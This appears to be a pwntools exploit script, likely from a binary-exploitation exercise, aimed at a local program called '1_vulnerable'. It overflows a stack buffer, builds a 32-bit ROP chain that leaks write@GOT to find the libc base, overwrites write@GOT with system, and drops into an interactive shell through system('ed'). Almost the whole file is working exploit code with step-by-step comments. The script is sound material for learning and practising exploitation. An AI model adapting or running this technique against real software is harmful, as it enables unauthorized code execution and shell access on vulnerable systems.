#!/usr/bin/python 

from pwn import *

binary = './1_vulnerable'
p = process(binary) # Starts the process

offset___libc_start_main_ret = 0x18637
offset_system = 0x0003ada0
offset_dup2 = 0x000d6310
offset_read = 0x000d5b00
offset_write = 0x000d5b70
offset_str_bin_sh = 0x15ba0b

# objdump -d /lib/i386-linux-gnu/libc-2.23.so | grep setuid
# 000b12e0 <setuid@@GLIBC_2.0>:
offset_setuid = 0x000b12e0

# 0x0804845f <+36>:    call   0x8048320 <write@plt>
# 0x0804844c <+17>:    call   0x8048300 <read@plt>
write_PLT = 0x8048320 
read_PLT = 0x8048300 
new_system_PLT = write_PLT
new_setuid_PLT = write_PLT

# 0804a014  00000407 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
# 0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
write_GOT = 0x0804a014
read_GOT = 0x0804a00c

# Using gadget from binary is possible, it doesnt only have to be from libc
# Thing is since this isn't a PIE, address of pop, pop, pop, ret is hardcoded
# 0x080484e9 : pop esi ; pop edi ; pop ebp ; ret
pppr = 0x080484e9
pr = pppr + 2

# 1_vulnerable : 0x8048243 --> 0x72006465 ('ed')
str_ed = 0x8048243

# stdin = 0
# stdout = 1
# stderr = 2
stdin = 0
stdout = 1

def main():
	# 1094402369 found at offset: 28
	offset = 28 
	buf = 'A' * 28 

	# Crafting Payload

	# Leaking address of write@GOTS, ssize_t write(int fd, const void *buf, size_t count);
	buf += p32(write_PLT) # Function: Calls the write function	
	buf += p32(pppr) # Return: Function has 3 Parameters, so we need to pop 3 times to go to the next function
	buf += p32(stdout) # Arg 1: Write to STDOUT
	buf += p32(write_GOT) # Arg 2: Address/values contained inside of write@GOTS is to be written to the console
	buf += p32(4) # Arg 3: 32-Bits address is 4 Bytes in length 

	# Gets input from STDIN, ssize_t read(int fildes, void *buf, size_t nbyte);
	buf += p32(read_PLT) # Function: Calls the read function
	buf += p32(pppr) # Return: Function has 3 parameters, so we need to pop 3 times to go to the next function
	buf += p32(0) # Arg 1: Read is a write primite, so essentially we are writing to STDIN
	buf += p32(write_GOT) # Arg 2: Address/values contained inside of write@GOTS is to be read from us and written to
	buf += p32(4) # Arg 3: 32-Bits address is 4 Bytes in length
	# [1] IMPORTANT: program will pause after this because 

	# After overwriting write@GOT from stage 2 because of [1], payload will execute a shell
	buf += p32(new_system_PLT) # Function: Calls the system function
	buf += '\x90' * 4 # Return: To NOP
	buf += p32(str_ed) # Arg 1: ed so the full system call is system("ed")

	log.info("Length of payload: %s" % str(len(buf)) )

	# Sends payload to program
	p.send(buf)
	
	# Clear the 16 Bytes written because buffer size is 16 Bytes
	p.recv(16)

	leak = p.recv(4)
	write_addr = u32(leak)
	
	log.warn("<Leaking write address>")
	log.success("write addr: 0x%x" %write_addr)
	
	# Determine libc_base_addr 
	libc_base_addr = write_addr - offset_write
	log.success("libc base addr: 0x%x" %libc_base_addr)	

	# Calculate system_addr
	system_addr = libc_base_addr + offset_system
	log.success("system addr: 0x%x" %system_addr)
	
	# Calculate str_bin_sh_addr
	str_bin_sh_addr = libc_base_addr + offset_str_bin_sh
	log.success("/bin/sh addr: 0x%x" %str_bin_sh_addr)

	# Calculate setuid_addr
	setuid_addr = libc_base_addr + offset_setuid
	log.success("setuid addr: 0x%x" %setuid_addr) 

	# Send stage 2
	p.send(p32(system_addr))
	
	# Pass to debugger
	# raw_input(str(p.proc.pid))

	# Pass interaction back to user
	p.interactive()


if __name__ == "__main__":
	main()
